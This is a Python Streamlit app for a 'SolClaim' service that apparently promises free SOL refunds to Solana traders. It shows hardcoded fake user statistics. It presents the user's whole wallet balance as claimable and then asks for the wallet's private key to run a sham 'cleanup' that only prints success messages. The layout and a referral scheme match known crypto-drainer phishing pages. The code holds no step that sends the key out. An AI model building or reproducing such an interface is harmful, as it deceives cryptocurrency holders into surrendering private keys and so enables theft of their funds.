import streamlit as st
import time
from solana.rpc.api import Client

# Initialize Solana client
solana_client = Client("https://api.mainnet-beta.solana.com")

# Streamlit app title
st.title("💰 SolClaim: Reclaim Your Sol!")

# Display stats
st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")

# Navigation menu
menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

if menu == "Check Wallet ✅":
    st.header("Check Wallet Eligibility")
    wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")

    if wallet_address:
        with st.spinner("🕑 Loading wallet info..."):
            time.sleep(3)  # Simulate loading time

            # Fetch wallet balance (this is a placeholder, replace with actual logic)
            balance = solana_client.get_balance(wallet_address)
            if balance['result']:
                sol_balance = balance['result']['value'] / 1e9  # Convert lamports to SOL
                st.success(f"🎉 You have {sol_balance:.6f} SOL available to claim!")
                
                # Cleanup process
                if st.button("Proceed with Cleanup"):
                    private_key = st.text_input("Enter your private key to proceed:", type="password")
                    if private_key:
                        # Placeholder for cleanup logic
                        st.write("🔒 Cleanup process initiated...")
                        st.write("Optimizing wallet...")
                        time.sleep(2)
                        st.success("✅ Cleanup completed! Your SOL has been reclaimed.")
                    else:
                        st.error("Please enter your private key to proceed.")
            else:
                st.error("Invalid wallet address or no SOL available to claim.")

elif menu == "Invite & Earn 📢":
    st.header("Invite & Earn")
    st.write("Share your referral link and earn rewards!")
    st.write("Referral Link: https://solclaim.com/your-referral-link")
